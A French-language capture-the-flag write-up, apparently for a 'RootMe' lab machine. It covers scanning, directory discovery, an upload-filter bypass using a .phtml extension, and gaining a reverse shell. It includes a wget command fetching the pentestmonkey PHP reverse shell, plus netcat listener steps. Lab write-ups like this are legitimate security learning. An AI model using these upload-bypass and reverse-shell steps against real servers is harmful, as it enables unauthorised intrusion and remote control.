# 002_RootMe


## Ping de la cible

![image](https://user-images.githubusercontent.com/121682396/211824852-55babf40-963d-418f-9917-1d6e2959d49d.png)


## Ajout de l'ip dans le fichier /etc/hosts

![image](https://user-images.githubusercontent.com/121682396/211825307-26a093cf-c5c4-4e23-a499-dfd9f4e3b3c7.png)


## Trouver les ports ouverts et service qui tournent avec les versions

![image](https://user-images.githubusercontent.com/121682396/211826027-00d46ce2-6d7a-4b6c-9933-c75b4c5d1541.png)

     sV : Tente d'identifier la version du service


## Trouver les repértoires cachés sur le serveur web

![image](https://user-images.githubusercontent.com/121682396/211826966-3294df67-d799-4a16-9cb1-b184470cb535.png)

    dir : pour les repértoires 
    -w : pour la wordlist à utiliser
    -u : pour l'URL

Nous avons trouvés 2 répertoires <b>/uploads</b> et <b>/panel</b>

![image](https://user-images.githubusercontent.com/121682396/211829190-82496322-dc40-41a1-9b79-e82e5ade5bcc.png)
![image](https://user-images.githubusercontent.com/121682396/211829245-133f7358-68b3-4553-a2f9-9a64111c757c.png)

Nous voyons que nous pouvons uploader des <b>fichiers/images<b/> sur le path <b>/panel.</b>

Ici, notre obectif est d'injecter un <b>fichier PHP</b> et de l'éxécuter pour <b>récupèrer un shell</b> sur la machine.

C'est la cible qui ouvrira un shell vers notre machine ==> on appelle cela un <b>REVERSE SHELL</b>   

- On va éssayer de voir si l'extension .php peut être uploader

  ![image](https://user-images.githubusercontent.com/121682396/211833573-531bf32c-ff15-4a66-a469-ac7312dac2d4.png)
  On voit que l'extension <b>PHP</b> n'est pas accepté

- On voit que le développeur à bien filtré les fichiers uploadés en refusant les extensions en <b>.php</b>.

  Mais a t-il pris en compte les extensions alternatives valide pour exécuter du PHP comme sur l'image ci-dessous?

  ![image](https://user-images.githubusercontent.com/121682396/211835745-d9eac74d-5beb-483b-b98f-4733eea27820.png)

  Nous allons essayer d'uploader un fichier en essayant chacunes des extensions suivantes jusqu'à que cela fonctionne 
  
  Nous avons essayer l'extension <b>.phtml</b> et BINGO !!
  
  ![image](https://user-images.githubusercontent.com/121682396/211871058-dc716343-b2c2-4cf9-b65d-8e2e4369712d.png)
  
  Il ne manque plus qu'à récupèrer un reverse shell en php pour l'inclure dans notre fichier en .phtml

  Nous avons un repo GITHUB très connu qui est PENTESTMONKEY où nous avons un reverse-shell php que nous pouvons récupèrer et modifier au niveau de l'ip et du port
  
  ![image](https://user-images.githubusercontent.com/121682396/211871956-c01c56f1-6bcd-4889-8945-6761fa14f574.png)

      wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
      
      on change l'extension du fichier en .phtml
      
      on Modifie l'ip avec notre IP côté attaquant et le numéro de port avec un port au choix (on peut laisser comme il est)
      
      on upload le fichier reverse-shell.phtml sur le path /panel
      
      on ouvre le port d'écoute (du fichier reverse-shell) sur notre machine attaquant avec netcat.
      Netcat est un outil permettant d'ouvrir des connexions réseau
     ![image](https://user-images.githubusercontent.com/121682396/211876392-1967ff52-2158-475a-8ddb-df9ecb95a274.png)
      
      on ouvre le path /uploads et clic sur notre fichier uploader pour l'exécuter 
      
      Et voilà notre terminal est connecté à la machine cible et  toutes les commandes qu'on tapent seront exécutées maintenant
      sur la machine cible !!
     ![image](https://user-images.githubusercontent.com/121682396/211877071-bed59d3e-6895-423f-b37e-76597f59dba3.png)
